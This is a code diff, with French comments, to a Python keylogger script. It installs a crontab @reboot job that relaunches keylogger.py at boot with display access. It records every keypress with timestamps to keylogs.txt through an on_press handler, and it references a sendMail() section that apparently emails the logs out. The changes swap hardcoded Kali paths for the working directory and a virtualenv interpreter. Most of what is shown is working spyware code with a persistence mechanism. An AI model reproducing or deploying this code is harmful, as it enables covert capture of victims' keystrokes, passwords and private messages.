@@ -17,10 +17,12 @@ os.system('chmod +x keylogger.py')
 
 
 # Chemin vers le script Python
-python_script = "/home/kali/Downloads/keylogger.py"
+python_script = os.getcwd()+'/keylogger.py'
+
+path_env = os.getcwd()+'/env/bin/python'
 
 # Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
-cron_job = f"@reboot sleep 30 && DISPLAY=:0 /usr/bin/python3 {python_script} >> /home/kali/cronlog.txt 2>&1"
+cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
 
 # Obtenir la crontab actuelle de l'utilisateur
 current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
@@ -81,15 +83,12 @@ def sendMail():
 
 #--------FIN PARTIE ENVOI MAIL------------------
 
-
-
 logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                         datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)
 
 
 def on_press(key):
     logging.info(str(key))
-
 
 
 while True:
